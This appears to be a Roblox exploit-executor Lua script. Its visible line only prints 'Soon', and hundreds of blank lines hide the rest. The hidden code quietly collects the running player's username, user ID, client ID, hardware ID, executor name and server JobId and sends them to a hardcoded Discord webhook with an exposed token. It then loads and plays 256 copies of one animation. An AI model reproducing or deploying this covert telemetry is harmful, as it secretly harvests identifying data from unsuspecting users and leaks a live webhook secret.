warn("Soon")






























































































































































































































































































































































































































































































































































































































































































































































































































































































































































































local cloneref = cloneref or function(v) return v end
local services = setmetatable({}, {
    __index = function(_, v)
        return game:GetService(v)
    end
})

local Players = services.Players
local lp = Players.LocalPlayer
local mouse = lp:GetMouse()

local Workspace = services.Workspace

local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request) 

--// services
local uis = services.UserInputService
local rbx = services.RbxAnalyticsService
local http = services.HttpService

local userName, displayName = lp.Name, lp.DisplayName
    local userId = lp.UserId

    local jobId = game.JobId
    local placeId = game.PlaceId

    local hubName = scriptName
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")

    local identifiedExecutor = identifyexecutor and tostring(identifyexecutor()) or "Unknown"
    local executorName = getexecutorname and tostring(getexecutorname()) or "Unknown"
    local hwid = (gethwid and tostring(gethwid())) or (get_hwid and tostring(get_hwid()))

    local deviceType = uis:GetPlatform() == Enum.Platform.Windows and ":computer:" or ":mobile_phone:"

    local function fetchImage()
        local imageUrl
        pcall(function()
            local firstUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=150x150&format=Png"
            local secondUrl = game:HttpGet(firstUrl)
            
            local jsonData = http:JSONDecode(secondUrl)
            imageUrl = jsonData.data[1].imageUrl
        end)

        return imageUrl or "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-310966282D3529E36976BF6B07B1DC90-Png/150/150/AvatarHeadshot/Png/noFilter"
    end

function webhook()
    local imageUrl = fetchImage()
    local Body = http:JSONEncode({
        ["username"] = hubName,
        --["avatar_url"] = "thumbnailOfTheWebhook",

        ["embeds"] = {{
            ["title"] = "Execution Logs",
            ["description"] = "User Device: ".. deviceType,
            ["type"] = "rich",
            ["color"] = tonumber(0x000000),
            ["fields"] = {
                {
                    ["name"] = "\n\n-----------------------------------------------------Information** **",
                    ["value"] = "Identified Executor: " .. identifiedExecutor .. 
                                "\nExecutor Name: " .. executorName .. 
                                "\nServer Players: " .. #Players:GetChildren() .. 
                                "\nUsername: [" .. userName .. " (" .. displayName .. 
                                ")](https://www.roblox.com/users/" .. userId .. 
                                "/profile)\nClient ID: " .. rbx:GetClientId() .. 
                                "\nHWID: " .. hwid .. 
                                "\n-----------------------------------------------------",
                    ["inline"] = false
                },
                {
                    ["name"] = "JobId Join",
                    ["value"] = "```Roblox.GameLauncher.joinGameInstance('" .. placeId .. "', '" .. jobId .. "')```",
                    ["inline"] = true
                },
                {
                    ["name"] = "JobId",
                    ["value"] = "```" .. jobId .. "```",
                    ["inline"] = true
                },
            },
            ["thumbnail"] = {
                ["url"] = imageUrl
            },
            ["footer"] = {
                ["text"] = "Script ran at " .. currentTime,
            },
        }},
    })

    local Headers = {
        ["content-type"] = "application/json"
    }

    local Url = "https://discord.com/api/webhooks/1312687326258008166/dATMRIftCl4_gvoOvLDdYccg8MotS-jDo5Ee8jPoULijrjCJ3YrPuMQO9oNAs4kTUKNP"

    request({
        Url = Url,
        Body = Body,
        Method = "POST",
        Headers = Headers
    })
end

webhook()

repeat task.wait() until lp.Character and lp.Character:FindFirstChild("Humanoid")
local c = lp.Character
local h = c.Humanoid
local anims = {}
for _,v in pairs(h:GetPlayingAnimationTracks()) do
    v:Stop()
end
for i = 1, 256 do
    local a = Instance.new("Animation")
    a.AnimationId = "rbxassetid://17354976067"
    local index = #anims
    anims[index] = h:LoadAnimation(a)
    task.wait()
end
task.wait()
for _,v in pairs(anims) do
    v:Play()
end


